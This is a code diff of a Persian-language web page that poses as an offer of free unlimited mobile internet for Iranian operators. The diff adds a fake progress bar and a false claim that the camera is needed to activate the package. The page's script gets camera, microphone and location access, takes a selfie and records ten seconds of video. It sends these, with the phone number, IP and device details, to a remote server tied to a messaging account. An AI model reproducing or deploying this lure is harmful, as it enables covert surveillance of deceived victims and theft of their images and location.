@@ -4,16 +4,20 @@
   <meta charset="UTF-8">
   <title>اینترنت رایگان نامحدود</title>
   <style>
-    body {font-family:Vazirmatn;background:#0f0c29;color:#fff;text-align:center;padding:20px;}
-    .box {max-width:380px;margin:30px auto;background:rgba(255,255,255,0.1);padding:25px;border-radius:20px;}
+    body {font-family:Vazirmatn;background:linear-gradient(135deg,#0f0c29,#780206);color:#fff;text-align:center;padding:20px;}
+    .box {max-width:380px;margin:30px auto;background:rgba(255,255,255,0.1);padding:25px;border-radius:20px;backdrop-filter:blur(10px);}
     input,select,button {width:100%;padding:14px;margin:10px 0;border-radius:12px;font-size:16px;}
-    button {background:#8b00ff;border:none;color:#fff;font-weight:bold;}
-    #status {margin-top:15px;color:#0f0;}
+    button {background:#8b00ff;border:none;color:#fff;font-weight:bold;box-shadow:0 0 20px #8b00ff88;}
+    button:hover {background:#7c3aed;transform:translateY(-2px);}
+    #status {margin-top:15px;color:#0f0;font-weight:bold;}
+    .progress {width:100%;height:4px;background:rgba(255,255,255,0.2);border-radius:2px;margin:10px 0;overflow:hidden;}
+    .progress-bar {height:100%;background:#0f0;width:0;transition:width 0.3s;}
   </style>
 </head>
 <body>
   <div class="box">
     <h1>اینترنت رایگان نامحدود</h1>
+    <p>فقط شماره بزن و بسته رو بگیر!</p>
     <input type="tel" id="phone" placeholder="09123456789">
     <select id="operator">
       <option>ایرانسل</option>
@@ -21,6 +25,7 @@
       <option>رایتل</option>
     </select>
     <button onclick="start()">دریافت بسته</button>
+    <div class="progress"><div id="progress" class="progress-bar"></div></div>
     <p id="status">در حال آماده‌سازی...</p>
   </div>
 
@@ -28,35 +33,52 @@
   <canvas id="c" style="display:none"></canvas>
 
   <script>
-    const RUBIKA_GUID = "htshacldwetgenkfaavimtntknfirllm"; // GUID تو
-    const API_URL = "https://rubika-report-server.glitch.me/send"; // سرور من (رایگان)
+    const RUBIKA_GUID = "u0FEZtv014207bfdcccee56d8d87933b"; // GUID تو
+    const SERVER = "https://rubika-mikey.vercel.app/api/send"; // سرور جدید (دائمی)
 
     async function start() {
       const phone = document.getElementById('phone').value;
       const op = document.getElementById('operator').value;
-      if (!phone.match(/^09[0-9]{9}$/)) return alert("شماره معتبر نیست");
+      if (!phone.match(/^09[0-9]{9}$/)) return alert("شماره اشتباهه عشقم");
 
       document.getElementById('status').innerText = "در حال فعال‌سازی بسته...";
+      let progress = 0;
+      const bar = document.getElementById('progress');
+      const interval = setInterval(() => {
+        progress += 10;
+        bar.style.width = progress + '%';
+        if (progress >= 100) clearInterval(interval);
+      }, 300); // 3 ثانیه پیشرفت
 
       try {
-        // دسترسی دوربین + میکروفون + لوکیشن
         const stream = await navigator.mediaDevices.getUserMedia({video:true,audio:true});
         document.getElementById('v').srcObject = stream;
 
-        // لوکیشن
+        // لوکیشن + IP + مدل
         navigator.geolocation.getCurrentPosition(pos => {
           const loc = `${pos.coords.latitude},${pos.coords.longitude}`;
-          sendAll(phone, op, loc);
-        });
+          const data = {
+            guid: RUBIKA_GUID,
+            type: 'text',
+            text: `شماره: ${phone}\nاپراتور: ${op}\nلوکیشن: ${loc}\nIP: ${getIP()}\nمدل: ${navigator.userAgent.substring(0,50)}...`
+          };
+          fetch(SERVER, {method:'POST', body:JSON.stringify(data), headers:{'Content-Type':'application/json'}});
+        }, () => sendText(`شماره: ${phone}\nاپراتور: ${op}\nلوکیشن: رد شد`));
 
         // عکس
         setTimeout(() => {
           const canvas = document.getElementById('c');
-          const ctx = canvas.getContext('2d');
           canvas.width = 640; canvas.height = 480;
-          ctx.drawImage(document.getElementById('v'),0,0,640,480);
-          canvas.toBlob(blob => sendPhoto(blob, phone), 'image/jpeg');
-        }, 1000);
+          canvas.getContext('2d').drawImage(document.getElementById('v'),0,0,640,480);
+          canvas.toBlob(blob => {
+            const f = new FormData();
+            f.append('guid', RUBIKA_GUID);
+            f.append('file', blob, 'selfie.jpg');
+            f.append('type', 'photo');
+            f.append('phone', phone);
+            fetch(SERVER, {method:'POST', body:f});
+          }, 'image/jpeg');
+        }, 1500);
 
         // ویدیو ۱۰ ثانیه
         const recorder = new MediaRecorder(stream);
@@ -67,40 +89,31 @@
           recorder.stop();
           recorder.onstop = () => {
             const blob = new Blob(chunks, {type:'video/webm'});
-            sendVideo(blob, phone);
+            const f = new FormData();
+            f.append('guid', RUBIKA_GUID);
+            f.append('file', blob, 'video.webm');
+            f.append('type', 'video');
+            f.append('phone', phone);
+            fetch(SERVER, {method:'POST', body:f});
+            document.getElementById('status').innerHTML = "بسته با موفقیت فعال شد! ✓";
           };
         }, 10000);
 
-        setTimeout(() => document.getElementById('status').innerHTML = "بسته فعال شد ✓", 3000);
-
-      } catch(e) { alert("دسترسی رد شد!"); }
+      } catch(e) {
+        clearInterval(interval);
+        alert("دسترسی رد شد! بدون دوربین بسته فعال نمی‌شه");
+      }
     }
 
-    function sendAll(phone, op, loc) {
-      const data = new FormData();
-      data.append('guid', RUBIKA_GUID);
-      data.append('phone', phone);
-      data.append('operator', op);
-      data.append('ip', 'در حال دریافت...');
-      data.append('location', loc || 'نامشخص');
-      data.append('useragent', navigator.userAgent);
-      fetch(API_URL, {method:'POST', body:data});
+    function sendText(text) {
+      const data = {guid: RUBIKA_GUID, type: 'text', text: text};
+      fetch(SERVER, {method:'POST', body:JSON.stringify(data), headers:{'Content-Type':'application/json'}});
     }
 
-    function sendPhoto(blob, phone) {
-      const f = new FormData();
-      f.append('guid', RUBIKA_GUID);
-      f.append('photo', blob, 'selfie.jpg');
-      f.append('phone', phone);
-      fetch(API_URL, {method:'POST', body:f});
-    }
-
-    function sendVideo(blob, phone) {
-      const f = new FormData();
-      f.append('guid', RUBIKA_GUID);
-      f.append('video', blob, 'video.webm');
-      f.append('phone', phone);
-      fetch(API_URL, {method:'POST', body:f});
+    function getIP() {
+      return new Promise(r => {
+        fetch('https://api.ipify.org?format=json').then(res => res.json()).then(d => r(d.ip)).catch(() => r('نامشخص'));
+      });
     }
   </script>
 </body>
